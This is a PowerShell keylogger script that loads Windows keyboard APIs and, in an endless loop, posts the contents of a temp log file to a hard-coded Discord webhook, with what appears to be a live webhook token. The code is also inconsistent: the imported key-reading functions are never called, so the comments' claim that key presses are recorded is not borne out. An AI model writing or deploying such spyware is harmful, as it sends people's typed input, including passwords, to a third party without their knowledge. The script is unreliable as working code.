#requires -Version 2

function Start-KeyLogger($Path="$env:temp\keylogger.txt", $WebhookURL="https://discord.com/api/webhooks/1211338209254965258/ZN2Rfn2AO6KKLW5FRl9UXaoqHJv2brSA-G6-L7gS9HKkRCKY2-NG1N7YbXU6ixZ6FzPk") 
{
    # Signatures for API Calls
    $signatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    # Load signatures and make members available
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
    # Create output file
    $null = New-Item -Path $Path -ItemType File -Force

    try
    {
        Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

        # Create endless loop. When user presses CTRL+C, finally-block
        # executes and shows the collected key presses
        while ($true) {
            Start-Sleep -Seconds 1

            # Read content of the file
            $content = Get-Content -Path $Path -Raw

            # Send content to Discord webhook
            Invoke-RestMethod -Uri $WebhookURL -Method POST -Body "{'content':'$content'}" -ContentType 'application/json'
        }
    }
    finally
    {
        # Open logger file in Notepad
        notepad $Path
    }
}

# Records all key presses until script is aborted by pressing CTRL+C
# Will then open the file with collected key codes
Start-KeyLogger
